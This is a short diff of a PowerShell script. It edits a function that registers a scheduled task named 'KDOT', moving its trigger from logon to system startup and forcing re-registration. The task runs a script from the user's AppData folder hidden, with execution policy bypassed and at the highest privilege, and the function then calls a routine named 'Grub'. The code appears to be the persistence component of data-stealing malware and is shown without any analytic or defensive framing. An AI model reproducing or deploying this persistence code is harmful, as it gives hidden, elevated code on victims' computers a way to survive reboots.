@@ -33,9 +33,9 @@ function TASKS {
     if ($test -contains "KDOT") {
         Write-Host "KDOT already exists"
     } else {
-        $schedule = New-ScheduledTaskTrigger -AtLogOn
+        $schedule = New-ScheduledTaskTrigger -AtStartup
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1"
-        Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Highest
+        Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Highest -Force
     }
     Grub
 }
